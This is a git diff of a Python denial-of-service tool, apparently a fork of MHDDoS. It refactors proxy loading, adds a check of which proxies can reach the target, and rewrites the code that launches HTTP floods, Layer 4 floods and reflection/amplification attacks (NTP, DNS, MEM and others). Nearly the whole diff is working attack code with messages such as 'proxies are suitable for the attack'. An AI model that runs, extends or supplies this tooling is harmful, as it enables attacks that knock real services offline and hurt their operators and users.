@@ -1,9 +1,12 @@
 #!/usr/bin/env python3
 import ctypes
+import itertools
+import logging
+import math
 import os
 import sys
 from _socket import SHUT_RDWR
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor, as_completed, Future
 from contextlib import suppress
 from itertools import cycle
 from json import load
@@ -25,7 +28,7 @@ from sys import argv
 from sys import exit as _exit
 from threading import Event, Lock, Thread
 from time import sleep, time, perf_counter
-from typing import Any, List, Set, Tuple, Union
+from typing import Any, List, Set, Tuple, Union, Dict
 from urllib import parse
 from uuid import UUID, uuid4
 
@@ -38,7 +41,7 @@ from humanfriendly.terminal import ansi_wrap
 from icmplib import ping, Host
 from impacket.ImpactPacket import IP, TCP, UDP, Data
 from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
-from requests import Response, Session, exceptions, get
+from requests import Response, Session, exceptions, get, RequestException
 from yarl import URL
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
@@ -220,7 +223,6 @@ class Minecraft:
     def keepalive(num_id: int) -> bytes:
         return Minecraft.data(Minecraft.varint(0x00),
                               Minecraft.varint(num_id))
-
 
     @staticmethod
     def chat(message: str) -> bytes:
@@ -406,7 +408,7 @@ class Layer4(Thread):
                         REQUESTS_SENT += 1
                         bytes_sent += len(chat)
                         sleep(1.2)
-                        c-=1
+                        c -= 1
 
         except Exception:
             s.close()
@@ -1362,230 +1364,466 @@ class ToolsConsole:
         print(f"IP: {info['ip']}")
 
 
-def handleProxyList(con, proxy_li, proxy_ty, threads, url=None):
-    if proxy_ty not in {4, 5, 1, 0, 6}:
+def get_unique_proxies_from_set(proxies: Set[Proxy]) -> Set[Proxy]:
+    unique_proxies: Set[Proxy] = set()
+    seen: Set[(str, int)] = set()
+    for proxy in proxies:
+        proxy_signature = (proxy.host, proxy.port)
+        if proxy_signature not in seen:
+            seen.add(proxy_signature)
+            unique_proxies.add(proxy)
+
+    return unique_proxies
+
+
+def loadProxyList(config, proxies_file: Path, proxy_type: int) -> Union[Set[Proxy], None]:
+    """
+    Loads the list of proxies from the given file, and makes sure they are unique.
+
+    Args:
+        config: Config with default proxies (used if the file is not found).
+        proxies_file: Path to the text file with the list of proxy server addresses (one per line).
+        proxy_type: Type of the proxy (1 for HTTP, 4 for SOCKS4, 5 for SOCKS5, 6 for random).
+
+    Returns:
+        The list of loaded proxies. None if no proxies were loaded.
+    """
+    # check proxy type
+    if proxy_type not in {4, 5, 1, 0, 6}:
         exit("Socks Type Not Found [4, 5, 1, 0, 6]")
-    if proxy_ty == 6:
-        proxy_ty = randchoice([4, 5, 1])
-    if not proxy_li.exists():
-        logger.warning("The file doesn't exist, creating files and downloading proxies.")
-        proxy_li.parent.mkdir(parents=True, exist_ok=True)
-        with proxy_li.open("w") as wr:
-            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
-            logger.info(
-                f"{len(Proxies):,} Proxies are getting checked, this may take awhile!"
-            )
-            Proxies = ProxyChecker.checkAll(
-                Proxies, timeout=1, threads=threads,
-                url=url.human_repr() if url else "https://google.com",
-            )
+    if proxy_type == 6:
+        proxy_type = randchoice([4, 5, 1])
 
-            if not Proxies:
-                exit(
-                    "Proxy Check failed, Your network may be the problem"
-                    " | The target may not be available."
-                )
-            stringBuilder = ""
-            for proxy in Proxies:
-                stringBuilder += (proxy.__str__() + "\n")
-            wr.write(stringBuilder)
+    # check if file exists, and download default proxies if it doesn't
+    if not proxies_file.exists():
+        logger.warning("Provided proxy file doesn't exist, creating files and downloading proxies.")
+        proxies_file.parent.mkdir(parents=True, exist_ok=True)
+        proxies = ProxyManager.DownloadFromConfig(config, proxy_type)
 
-    proxies = ProxyUtiles.readFromFile(proxy_li)
+        # write new proxies to file
+        with proxies_file.open("w") as file:
+            proxies_list_string = ""
+            for proxy in proxies:
+                proxies_list_string += (proxy.__str__() + "\n")
+            file.write(proxies_list_string)
+
+    # read proxies from file
+    proxies = ProxyUtiles.readFromFile(proxies_file)
     if proxies:
-        logger.info(f"Proxy Count: {len(proxies):,}")
+        proxies = get_unique_proxies_from_set(proxies)
+        logger.info(f"Loaded {len(proxies)} unique proxies from file.")
     else:
-        logger.info(
-            "Empty Proxy File, running flood witout proxy")
         proxies = None
+        logger.info("Empty proxy file provided, running attack without proxies.")
 
     return proxies
 
 
+class CyclicPeriods:
+
+    def __init__(self, update_interval: float = 0.5, max_periods: int = 3):
+        self.update_interval = update_interval
+        self.max_periods = max_periods
+
+    def __str__(self):
+        n_periods = int((time() * 1.0 / self.update_interval % self.max_periods)) + 1
+        periods = "".join(["." for _ in range(n_periods)])
+        return periods
+
+
+def validateProxyList(proxies: Set[Proxy],
+                      target_ip: str,
+                      port: int,
+                      mhddos_attack_method: str,
+                      target_url: str = None) -> Set[Proxy]:
+    if not proxies:
+        return set()
+
+    n_proxies = len(proxies)
+    n_cycles = 1
+    l4_retries = 1
+    l4_timeout = 2
+    l4_interval = 0.2
+    l7_timeout = 0.01  # no need to check Layer 7 before the attack started
+    expected_max_duration_min = math.ceil(float(n_cycles * (l4_retries * (l4_timeout + l4_interval) + l7_timeout)) / 60)
+
+    message = f"Checking if the target is reachable through the provided proxies...\n"
+    heart = ansi_wrap("♥", color="red")
+    message += f"    This may take up to {expected_max_duration_min} min, but will make the attack more effective. Please hold on {heart}"
+    print(message)
+
+    check_start_time = perf_counter()
+    validated_proxies: Set[Proxy] = set()
+    n_validated = Counter(0)
+    n_cycle = Counter(1)
+
+    def proxy_check_thread():
+        for i in range(n_cycles):
+            n_cycle.set(i + 1)
+
+            # check if the provided proxies can reach our target
+            l4_result, \
+            l7_response, \
+            l4_proxied_results, \
+            l7_proxied_responses = TargetHealthCheckUtils.health_check(target_ip, port,
+                                                                       mhddos_attack_method,
+                                                                       target_url,
+                                                                       list(proxies),
+                                                                       layer_4_retries=l4_retries,
+                                                                       layer_4_timeout=l4_timeout,
+                                                                       layer_4_interval=l4_interval,
+                                                                       layer_7_timeout=l7_timeout)
+
+            # grab valid proxies from the results
+            for j, proxy in enumerate(proxies):
+                proxied_result = l4_proxied_results[j]
+                if proxied_result.is_alive:
+                    validated_proxies.add(proxy)
+
+                proxied_response = l7_proxied_responses[j]
+                if proxied_response:
+                    validated_proxies.add(proxy)
+
+            # update stats
+            n_validated.set(len(validated_proxies))
+
+    # run checks in another thread
+    thread = Thread(daemon=True, target=proxy_check_thread)
+    thread.start()
+
+    # display waiting notification
+    GO_TO_PREVIOUS_LINE = f"\033[A"
+    CLEAR_LINE = "\033[K"
+    GO_TO_LINE_START = "\r"
+    cyclic_periods = CyclicPeriods()
+    first_run = True
+    while thread.is_alive():
+        if int(n_validated) < 1:
+            print(f"    Proxy check cycle {int(n_cycle)}/{n_cycles}{cyclic_periods}")
+        else:
+            p_word = "proxies" if int(n_validated) > 1 else "proxy"
+            message = f"    Proxy check cycle {int(n_cycle)}/{n_cycles} ("
+            message += ansi_wrap(f"confirmed {int(n_validated)} {p_word}", color="green")
+            message += f"){cyclic_periods}"
+            print(message)
+
+        sleep(cyclic_periods.update_interval)
+
+        returner = f"{GO_TO_PREVIOUS_LINE}{GO_TO_LINE_START}{CLEAR_LINE}"
+        print(returner, end="")
+
+
+    duration = perf_counter() - check_start_time
+    n_validated = int(n_validated)
+    if n_validated > 0:
+        message = f"    Checked {n_proxies} proxies in {duration:.0f} sec. "
+        message += ansi_wrap(f"{n_validated} {'proxies are' if n_validated > 1 else 'proxy is'} suitable for the attack.", color="green")
+        print(message)
+    else:
+        exit("The target is not reachable through any of the provided proxies. The target may be down.")
+
+    return validated_proxies
+
+
 def start():
     with open(__dir__ / "config.json") as f:
-        con = load(f)
-        with suppress(KeyboardInterrupt):
-            with suppress(IndexError):
-                one = argv[1].upper()
+        config = load(f)
+        with suppress(IndexError):
+            one = argv[1].upper()
 
-                if one == "HELP":
-                    raise IndexError()
-                if one == "TOOLS":
-                    ToolsConsole.runConsole()
-                if one == "STOP":
-                    ToolsConsole.stop()
+            if one == "HELP":
+                raise IndexError()
+            if one == "TOOLS":
+                ToolsConsole.runConsole()
+            if one == "STOP":
+                ToolsConsole.stop()
 
-                method = one
-                host = None
-                url = None
-                urlraw = None
-                event = Event()
-                event.clear()
-                target = None
-                urlraw = argv[2].strip()
-                urlraw = ToolsConsole.ensure_http_present(urlraw)
-                port = None
+            method = one
+            host = None
+            url = None
+            urlraw = None
+            event = Event()
+            event.clear()
+            host = None
+            urlraw = argv[2].strip()
+            urlraw = ToolsConsole.ensure_http_present(urlraw)
+            port = None
+            proxies = None
+
+            if method not in Methods.ALL_METHODS:
+                exit("Method Not Found %s" %
+                     ", ".join(Methods.ALL_METHODS))
+
+            if method in Methods.LAYER7_METHODS:
+                url = URL(urlraw)
+                host = url.host
+                try:
+                    host = gethostbyname(url.host)
+                except Exception as e:
+                    exit('Cannot resolve hostname ', url.host, e)
+                ip = ToolsConsole.get_ip(urlraw)
+                # print(f"IP: {ip}")
+                # print(f"Port: {url.port}")
+                threads = int(argv[4])
+                rpc = int(argv[6])
+                timer = int(argv[7])
+                proxy_type = int(argv[3].strip())
+                proxy_path_relative = argv[5].strip()
+                proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
+                if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
+                    proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)
+                useragent_file_path = Path(__dir__ / "files/useragent.txt")
+                referrers_file_path = Path(__dir__ / "files/referers.txt")
+                global bombardier_path
+                bombardier_path = Path(__dir__ / "go/bin/bombardier")
+
+                if method == "BOMB":
+                    assert (
+                            bombardier_path.exists()
+                            or bombardier_path.with_suffix('.exe').exists()
+                    ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
+
+                if len(argv) == 9:
+                    logger.setLevel("DEBUG")
+
+                if not useragent_file_path.exists():
+                    exit("The Useragent file doesn't exist ")
+                if not referrers_file_path.exists():
+                    exit("The Referer file doesn't exist ")
+
+                uagents = set(a.strip()
+                              for a in useragent_file_path.open("r+").readlines())
+                referers = set(a.strip()
+                               for a in referrers_file_path.open("r+").readlines())
+
+                if not uagents: exit("Empty Useragent File ")
+                if not referers: exit("Empty Referer File ")
+
+                if threads > 1000:
+                    logger.warning("Number of threads is higher than 1000")
+                if rpc > 100:
+                    logger.warning("RPC (Requests Per Connection) number is higher than 100")
+
+                proxies = loadProxyList(config, proxy_file_path, proxy_type)
+                proxies = validateProxyList(proxies, ip, int(url.port), method, urlraw)
+                for _ in range(threads):
+                    HttpFlood(url, host, method, rpc, event, uagents, referers, proxies).start()
+
+            if method in Methods.LAYER4_METHODS:
+                url = URL(urlraw)
+
+                port = url.port
+                host = url.host
+
+                try:
+                    host = gethostbyname(host)
+                except Exception as e:
+                    exit('Cannot resolve hostname ', url.host, e)
+
+                if port > 65535 or port < 1:
+                    exit("Invalid Port [Min: 1 / Max: 65535] ")
+
+                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
+                        not ToolsConsole.checkRawSocket():
+                    exit("Cannot Create Raw Socket")
+
+                threads = int(argv[3])
+                timer = int(argv[4])
                 proxies = None
-
-                if method not in Methods.ALL_METHODS:
-                    exit("Method Not Found %s" %
-                         ", ".join(Methods.ALL_METHODS))
-
-                if method in Methods.LAYER7_METHODS:
-                    url = URL(urlraw)
-                    host = url.host
-                    try:
-                        host = gethostbyname(url.host)
-                    except Exception as e:
-                        exit('Cannot resolve hostname ', url.host, e)
-                    ToolsConsole.print_ip(urlraw)
-                    print(f"Port: {url.port}")
-                    threads = int(argv[4])
-                    rpc = int(argv[6])
-                    timer = int(argv[7])
-                    proxy_ty = int(argv[3].strip())
-                    proxy_path_relative = argv[5].strip()
-                    proxy_li = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
-                    if not proxy_li.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
-                        proxy_li = Path(__dir__ / "files/proxies/" / proxy_path_relative)
-                    useragent_li = Path(__dir__ / "files/useragent.txt")
-                    referers_li = Path(__dir__ / "files/referers.txt")
-                    global bombardier_path
-                    bombardier_path = Path(__dir__ / "go/bin/bombardier")
-                    proxies: Any = set()
-
-                    if method == "BOMB":
-                        assert (
-                                bombardier_path.exists()
-                                or bombardier_path.with_suffix('.exe').exists()
-                        ), (
-                            "Install bombardier: "
-                            "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
-                        )
-
-                    if len(argv) == 9:
-                        logger.setLevel("DEBUG")
-
-                    if not useragent_li.exists():
-                        exit("The Useragent file doesn't exist ")
-                    if not referers_li.exists():
-                        exit("The Referer file doesn't exist ")
-
-                    uagents = set(a.strip()
-                                  for a in useragent_li.open("r+").readlines())
-                    referers = set(a.strip()
-                                   for a in referers_li.open("r+").readlines())
-
-                    if not uagents: exit("Empty Useragent File ")
-                    if not referers: exit("Empty Referer File ")
-
-                    if threads > 1000:
-                        logger.warning("Thread is higher than 1000")
-                    if rpc > 100:
-                        logger.warning(
-                            "RPC (Request Pre Connection) is higher than 100")
-
-                    proxies = handleProxyList(con, proxy_li, proxy_ty, threads, url)
-                    for _ in range(threads):
-                        HttpFlood(url, host, method, rpc, event, uagents,
-                                  referers, proxies).start()
-
-                if method in Methods.LAYER4_METHODS:
-                    target = URL(urlraw)
-
-                    port = target.port
-                    target = target.host
-
-                    try:
-                        target = gethostbyname(target)
-                    except Exception as e:
-                        exit('Cannot resolve hostname ', url.host, e)
-
-                    if port > 65535 or port < 1:
-                        exit("Invalid Port [Min: 1 / Max: 65535] ")
-
-                    if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
-                            not ToolsConsole.checkRawSocket():
-                        exit("Cannot Create Raw Socket")
-
-                    threads = int(argv[3])
-                    timer = int(argv[4])
-                    proxies = None
-                    ref = None
-                    if not port:
-                        logger.warning("Port Not Selected, Set To Default: 80")
-                        port = 80
-
-                    if len(argv) >= 6:
-                        argfive = argv[5].strip()
-                        if argfive:
-                            refl_li = Path(__dir__ / "files" / argfive)
-                            if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
-                                if not refl_li.exists():
-                                    exit("The reflector file doesn't exist")
-                                if len(argv) == 7:
-                                    logger.setLevel("DEBUG")
-                                ref = set(a.strip()
-                                          for a in ProxyTools.Patterns.IP.findall(
-                                    refl_li.open("r+").read()))
-                                if not ref: exit("Empty Reflector File ")
-
-                            elif argfive.isdigit() and len(argv) >= 7:
-                                if len(argv) == 8:
-                                    logger.setLevel("DEBUG")
-                                proxy_ty = int(argfive)
-                                proxy_path_relative = argv[6].strip()
-                                proxy_li = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
-                                if not proxy_li.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
-                                    proxy_li = Path(__dir__ / "files/proxies/" / proxy_path_relative)
-                                proxies = handleProxyList(con, proxy_li, proxy_ty, threads)
-                                if method not in {"MINECRAFT", "MCBOT", "TCP"}:
-                                    exit("this method cannot use for layer4 proxy")
-
-                            else:
-                                logger.setLevel("DEBUG")
-
-                    for _ in range(threads):
-                        Layer4((target, port), ref, method, event,
-                               proxies).start()
-
-                # start health check thread
+                referrers = None
                 if not port:
-                    if urlraw and "https://" in urlraw:
-                        port = 443
-                    else:
-                        port = 80
-                if not target:
-                    target = ToolsConsole.get_ip(urlraw)
-                ip = target
-                health_check_thread = Thread(
-                    daemon=True,
-                    target=target_health_check_loop,
-                    args=(ip, port, method, urlraw, proxies)
-                )
-                health_check_thread.start()
+                    logger.warning("Port Not Selected, Set To Default: 80")
+                    port = 80
 
-                logger.info(f"Attack Started to {target or url.human_repr()} with {method} method for {timer} seconds, threads: {threads}!")
-                event.set()
-                ts = time()
+                if len(argv) >= 6:
+                    argfive = argv[5].strip()
+                    if argfive:
+                        referrers_file_path = Path(__dir__ / "files" / argfive)
+                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
+                            if not referrers_file_path.exists():
+                                exit("The reflector file doesn't exist")
+                            if len(argv) == 7:
+                                logger.setLevel("DEBUG")
+                                referrers = set(a.strip() for a in ProxyTools.Patterns.IP.findall(referrers_file_path.open("r+").read()))
+                            if not referrers:
+                                exit("Empty Reflector File ")
 
-                global bytes_sent, REQUESTS_SENT, TOTAL_REQUESTS_SENT, TOTAL_BYTES_SENT
+                        elif argfive.isdigit() and len(argv) >= 7:
+                            if len(argv) == 8:
+                                logger.setLevel("DEBUG")
+                            proxy_type = int(argfive)
+                            proxy_path_relative = argv[6].strip()
+                            proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
+                            if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
+                                proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)
+                            proxies = loadProxyList(config, proxy_file_path, proxy_type)
+                            proxies = validateProxyList(proxies, ip, port, method, urlraw)
+                            if method not in {"MINECRAFT", "MCBOT", "TCP"}:
+                                exit("this method cannot use for layer4 proxy")
 
-                while time() < ts + timer:
-                    log_attack_status()
+                        else:
+                            logger.setLevel("DEBUG")
 
-                    # update request counts
-                    TOTAL_REQUESTS_SENT += int(REQUESTS_SENT)
-                    TOTAL_BYTES_SENT += int(bytes_sent)
-                    REQUESTS_SENT.set(0)
-                    bytes_sent.set(0)
+                for _ in range(threads):
+                    Layer4((host, port), referrers, method, event, proxies).start()
 
-                    sleep(1)
+            # start health check thread
+            if not port:
+                if urlraw and "https://" in urlraw:
+                    port = 443
+                else:
+                    port = 80
+            if not host:
+                host = ToolsConsole.get_ip(urlraw)
+            ip = host
+            health_check_thread = Thread(
+                daemon=True,
+                target=target_health_check_loop,
+                args=(HEALTH_CHECK_INTERVAL, ip, port, method, urlraw, proxies)
+            )
+            health_check_thread.start()
 
-                event.clear()
-                exit()
+            logger.info(f"Attack Started to {host or url.human_repr()} with {method} method for {timer} seconds, threads: {threads}!")
+            event.set()
+            ts = time()
 
-            ToolsConsole.usage()
+            global bytes_sent, REQUESTS_SENT, TOTAL_REQUESTS_SENT, TOTAL_BYTES_SENT
+
+            while time() < ts + timer:
+                log_attack_status()
+
+                # update request counts
+                TOTAL_REQUESTS_SENT += int(REQUESTS_SENT)
+                TOTAL_BYTES_SENT += int(bytes_sent)
+                REQUESTS_SENT.set(0)
+                bytes_sent.set(0)
+
+                sleep(1)
+
+            event.clear()
+            exit()
+
+        ToolsConsole.usage()
+
+
+class TargetHealthCheckUtils:
+    @staticmethod
+    def layer_4_ping(ip: str, port: int, retries: int = 5, timeout: float = 2, interval: float = 0.2, proxy: Proxy = None) -> Host:
+        round_trip_times = []
+        # print(f"// proxy {proxy.host}:{proxy.port} /")
+        for _ in range(retries):
+            try:
+                with (socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) if proxy is None else proxy.open_socket()) as s:
+                    start_time = perf_counter()
+                    # print(f"proxy {proxy.host}:{proxy.port} - trying...")
+                    s.settimeout(timeout)
+                    s.connect((ip, port))
+                    s.shutdown(SHUT_RDWR)
+                    duration = perf_counter() - start_time
+                    round_trip_times.append(duration * 1000)
+                    sleep(interval)
+                    # print(f"proxy {proxy.host}:{proxy.port} - rtt {duration}")
+            except OSError as e:  # https://docs.python.org/3/library/socket.html#exceptions
+                # print(f"proxy {proxy.host}:{proxy.port} - {e}")
+                pass
+
+        return Host(proxy.host, retries, round_trip_times)
+
+    @staticmethod
+    def layer_7_ping(url: str, timeout: float = 10, proxy: Proxy = None) -> Union[Response, None]:
+        # TODO: Add headers to make it look like a browser request
+        try:
+            proxies = None
+            if proxy:
+                proxies = {
+                    "http": proxy.__str__(),
+                    "https": proxy.__str__()
+                }
+            return get(url, timeout=timeout, proxies=proxies)
+        except RequestException:
+            return None  # indeterminate
+
+    @staticmethod
+    def health_check(ip: Union, port: int,
+                     method: str = None,
+                     url: str = None,
+                     proxies: List[Proxy] = None,
+                     layer_4_retries: int = 5,
+                     layer_4_timeout: float = 2,
+                     layer_4_interval: float = 0.2,
+                     layer_7_timeout: float = 10) -> (Host, Response, List[Host], List[Response]):
+        """
+        Checks the health of the target on Layer 4 and Layer 7
+        (depending on the selected protocol and attack method).
+
+        Args:
+            ip: IP of the target.
+            port: Port of the target
+            method: MHDDoS attack method.
+            url: URL of the target.
+            proxies: List of the proxies to use where possible for connectivity check.
+            layer_4_retries: Number of retries when checking connectivity via Layer 4.
+            layer_4_timeout: Timeout when checking connectivity via Layer 4.
+            layer_4_interval: Interval between retries when checking connectivity via Layer 4.
+            layer_7_timeout: Timeout when checking connectivity via Layer 7.
+
+        Returns:
+            A tuple containing
+              (1) Host status for Layer 4.
+              (2) HTTP response for Layer 7.
+              (3) Host statuses for Layer 4 in a list corresponding to the provided list of proxies.
+              (4) HTTP responses for Layer 7 in a list corresponding to the provided list of proxies.
+
+        Notes:
+            Layer 7 results will be None if it is not applicable to the selected attack method, or if the target port does not support HTTP protocol.
+        """
+
+        # handle Layer 4
+        layer_4_result = None
+        layer_4_proxied_results = None
+        if (method in {"MINECRAFT", "MCBOT", "TCP"} or method in Methods.LAYER7_METHODS) \
+                and proxies and len(proxies) > 0:
+            # these Layer 4 methods can use proxies, so check for every proxy using proxied TCP socket
+            with ThreadPoolExecutor() as executor:
+                # we use executor.map to ensure that the order of the ping results corresponds to the passed list of proxies
+                n = len(proxies)
+                layer_4_proxied_results = list(executor.map(TargetHealthCheckUtils.layer_4_ping,
+                                                            itertools.repeat(ip, n),
+                                                            itertools.repeat(port, n),
+                                                            itertools.repeat(layer_4_retries, n),
+                                                            itertools.repeat(layer_4_timeout, n),
+                                                            itertools.repeat(layer_4_interval, n),
+                                                            proxies))
+        else:
+            # check using TCP socket without proxy
+            layer_4_result = TargetHealthCheckUtils.layer_4_ping(ip, port, retries=layer_4_retries, timeout=layer_4_timeout, interval=layer_4_interval)
+
+        # handle Layer 7
+        layer_7_response = None
+        layer_7_proxied_responses = None
+        url = ToolsConsole.ensure_http_present(url if url else ip)
+        if proxies is not None:
+            # proxies are provided, so check for every proxy
+            with ThreadPoolExecutor() as executor:
+                # we use executor.map to ensure that the order of the responses corresponds to the passed list of proxies
+                n = len(proxies)
+                layer_7_proxied_responses = list(executor.map(TargetHealthCheckUtils.layer_7_ping,
+                                                              itertools.repeat(url, n),
+                                                              itertools.repeat(layer_7_timeout, n),
+                                                              proxies))
+        else:
+            layer_7_response = TargetHealthCheckUtils.layer_7_ping(url, layer_7_timeout)
+
+        # result_string = "Healthcheck:\n"
+        # # if ping_result is not None:
+        # #     result_string += f"    Ping: {ping_result.avg_rtt:.0f} ms, {ping_result.is_alive}\n"
+        # if layer_4_result is not None:
+        #     result_string += f"    Layer 4: {layer_4_result.is_alive}, average {layer_4_result.avg_rtt:.0f} ms, packet loss {layer_4_result.packet_loss * 100:.0f}%\n"
+        # if layer_7_response is not None:
+        #     result_string += f"    Layer 7: code {layer_7_response.status_code}, reason: {layer_7_response.reason}\n"
+        # print(result_string)
+
+        return layer_4_result, layer_7_response, layer_4_proxied_results, layer_7_proxied_responses
 
 
 is_target_reachable: bool = False
@@ -1598,145 +1836,30 @@ last_ping_result: Host = None
 last_get_response: Response = None
 """Result of the last healthcheck GET request to the target."""
 
-
-def check_socket_connection():
-    pass
-
-def isOpen(ip: str, port: int, timeout: float):
-    s = socket(AF_INET, SOCK_STREAM)
-    s.settimeout(timeout)
-    try:
-        s.connect((ip, port))
-        s.shutdown(SHUT_RDWR)
-        return True
-    except Exception as e:
-        print(e)
-        return False
-    finally:
-        s.close()
+HEALTH_CHECK_INTERVAL = 60
+last_l4_result: Host = None
+last_l7_response: Response = None
+last_l4_proxied_results: List[Host] = None
+last_l7_proxied_responses: List[Response] = None
 
 
-def layer_4_ping(s: socket, ip: str, port: int, count: int = 5, timeout: int = 2) -> Host:
-    round_trip_times = []
-    for _ in range(count):
-        s.settimeout(timeout)
-        try:
-            start_time = perf_counter()
-            s.connect((ip, port))
-            s.shutdown(SHUT_RDWR)
-            round_trip_time_ms = (perf_counter() - start_time) * 1000
-            round_trip_times.append(round_trip_time_ms)
-        except (KeyboardInterrupt, SystemExit):
-            raise
-        except OSError:  # https://docs.python.org/3/library/socket.html#exceptions
-            pass
-
-    return Host(ip, count, round_trip_times)
-
-
-def health_check(ip: Union, port: int,
-                 method: str = None,
-                 url: str = None,
-                 proxies: Set = None,
-                 layer_4_retries: int = 5,
-                 layer_4_timeout: float = 2,
-                 layer_7_timeout: float = 10) -> (Host, Response):
-    """
-    Checks the health of the target on Layer 4 and Layer 7
-    (depending on the selected protocol and attack method).
-
-    Args:
-        ip: IP of the target.
-        port: Port of the target
-        method: MHDDoS attack method.
-        url: URL of the target.
-        proxies: List of the proxies to use where possible for connectivity check.
-        layer_4_retries: Number of retries when checking target connectivity via Layer 4.
-        layer_4_timeout: Timeout when checking target connectivity via Layer 4.
-        layer_7_timeout: Timeout when checking target connectivity via Layer 7.
-
-    Returns:
-        Host status for Layer 4 and HTTP Response for Layer 7.
-        Layer 7 result will be None if it is not applicable to the selected attack method,
-        or if the target port does not support HTTP protocol.
-    """
-    if url:
-        print(f"Starting health check for {ip} / {url}.\n")
-    else:
-        print(f"Starting health check for {ip}.\n")
-
-    PING_TIMEOUT = 2
-    LAYER_4_TIMEOUT = 2
-    LAYER_4_RETRIES = 5
-    LAYER_7_TIMEOUT = 10
-
-    # handle Layer 4
-    print("Checking Layer 4...")
-    layer_4_result = None
-    if (method in {"MINECRAFT", "MCBOT", "TCP"} or method in Methods.LAYER7_METHODS) \
-            and proxies is not None and len(proxies) > 0:
-        print("with proxies")
-        # these Layer 4 methods can use proxies, so check for every proxy using proxied TCP socket
-        results = []
-        proxied_sockets = [proxy.open_socket() for proxy in proxies]
-
-        with ThreadPoolExecutor() as executor:
-            futures = []
-            for s in proxied_sockets:
-                futures.append(executor.submit(layer_4_ping, s, ip, port, LAYER_4_RETRIES, LAYER_4_TIMEOUT))
-            for future in as_completed(futures):
-                results.append(future.result())
-
-        for s in proxied_sockets:
-            s.close()
-
-        alive_count = 0
-        for r in results:
-            if r.is_alive:
-                alive_count += 1
-            print(f"result {r.is_alive} {r.avg_rtt:.0f} ms")
-        print(f"Target is reachable through {alive_count}/{len(proxies)} proxies.")
-
-    else:
-        # check using TCP socket without proxy
-        with socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) as s:
-            layer_4_result = layer_4_ping(s, ip, port, LAYER_4_RETRIES, LAYER_4_TIMEOUT)
-
-    # handle Layer 7
-    print("Checking Layer 7...")
-    layer_7_response = None
-    url = ToolsConsole.ensure_http_present(url if url else ip)
-    if proxies is not None:
-        # proxies are provided, so check for every proxy
-        # TODO: threaded requests, one per each proxy
-        pass
-    else:
-        try:
-            layer_7_response = get(url, timeout=10)
-        except (KeyboardInterrupt, SystemExit):
-            raise
-        except Exception:
-            layer_7_response = None  # indeterminate
-
-    result_string = "Healthcheck:\n"
-    # if ping_result is not None:
-    #     result_string += f"    Ping: {ping_result.avg_rtt:.0f} ms, {ping_result.is_alive}\n"
-    if layer_4_result is not None:
-        result_string += f"    Layer 4: {layer_4_result.is_alive}, average {layer_4_result.avg_rtt:.0f} ms\n"
-    if layer_7_response is not None:
-        result_string += f"    Layer 7: code {layer_7_response.status_code}, reason: {layer_7_response.reason}\n"
-    print(result_string)
-
-    return layer_4_result, layer_7_response
-
-
-def target_health_check_loop(ip: str, port: int, method: str, url: Union[str, None], proxies: Union[set, None], interval: float = 5):
-    global last_ping_result, is_target_healthy, last_target_health_check_timestamp
+def target_health_check_loop(interval: float, ip: str, port: int, method: str, url: Union[str, None], proxies: Union[set, None]):
+    global last_l4_result, last_l7_response, last_l4_proxied_results, last_l7_proxied_responses, last_target_health_check_timestamp
 
     while True:
+        while time() - last_target_health_check_timestamp < interval:
+            sleep(1)
+
         last_target_health_check_timestamp = time()
 
-        _ = health_check(ip, port, method, url, proxies)
+        last_l4_result, \
+        last_l7_response, \
+        last_l4_proxied_results, \
+        last_l7_proxied_responses = TargetHealthCheckUtils.health_check(ip, port, method, url, proxies,
+                                                                        layer_4_retries=1,
+                                                                        layer_4_timeout=2,
+                                                                        layer_4_interval=0.2,
+                                                                        layer_7_timeout=10)
 
         # is_open = isOpen(ip, 443, 1)
         # print(f"AAAAAAA {is_open}")
@@ -1779,7 +1902,7 @@ def log_attack_status():
     if not status_logging_started:
         status_logging_started = True
     else:
-        # print(returner)
+        print(returner)
         pass
     logger.debug(status_string)
 
@@ -1809,61 +1932,85 @@ def craft_connectivity_log_message():
     time_since_last_health_check = time() - last_target_health_check_timestamp
 
     # craft reachability header
-    status_string += "    Reachability"
-    if last_ping_result:
-        status_string
-    status_string += ":\n"
+    status_string += "    Reachability:\n"
 
     # for waiting periods animation
     n_periods = (int(time()) % 3) + 1
     periods = "".join(["." for _ in range(n_periods)])
 
-    # craft ping line
-    status_string += "       "
-    if last_ping_result:
-        status_string += "Target is"
-        pr = last_ping_result
-        if pr.is_alive:
-            successful_pings_ratio = float(pr.packets_sent) / pr.packets_received
+    # craft Layer 4 check line
+    status_string += "       Layer 4:"
+    if last_l4_result:
+        status_string += " Target is"
+        r = last_l4_result
+        if r.is_alive:
+            successful_pings_ratio = float(r.packets_sent) / r.packets_received
             if successful_pings_ratio > 0.5:
                 status_string += ansi_wrap(f" REACHABLE", color="green")
-                status_string += f" from our IP (ping {pr.avg_rtt:.0f} ms, no packets lost)."
+                status_string += f" from our IP (ping {r.avg_rtt:.0f} ms, no packets lost)."
             else:
                 status_string += ansi_wrap(f" PARTIALLY REACHABLE", color="yellow")
-                status_string += f" from our IP (ping {pr.avg_rtt:.0f} ms, {pr.packet_loss*100:.0f}% packet loss)."
